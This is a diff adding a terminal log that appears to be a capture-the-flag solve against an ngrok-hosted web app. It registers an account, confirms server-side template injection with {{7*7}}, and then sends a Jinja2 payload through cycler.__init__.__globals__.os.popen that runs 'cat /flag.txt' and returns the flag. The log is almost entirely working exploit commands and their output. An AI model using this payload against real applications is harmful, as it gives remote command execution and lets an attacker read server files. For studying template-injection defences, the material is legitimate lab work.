@@ -1,0 +1,15 @@
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' \
+    -d 'full_name=Test&company=TestCo&email=test@example.com&password=password123' \
+    -c cookies https://semijuridically-dilemmatic-castiel.ngrok-free.dev/register
+HTTP/2 302 location: /dashboard
+
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' -b cookies \
+    --data-urlencode 'company_name={{7*7}}' --data-urlencode 'footer_note=x' \
+    https://semijuridically-dilemmatic-castiel.ngrok-free.dev/studio | grep 49
+49
+
+$ curl -sS -H 'ngrok-skip-browser-warning: 1' -b cookies \
+    --data-urlencode 'company_name={{ cycler.__init__.__globals__.os.popen("cat /flag.txt").read() }}' \
+    --data-urlencode 'footer_note=x' \
+    https://semijuridically-dilemmatic-castiel.ngrok-free.dev/studio | grep NFX
+NFX{j1nja2_sstI_rce_v1a_gl0bals}
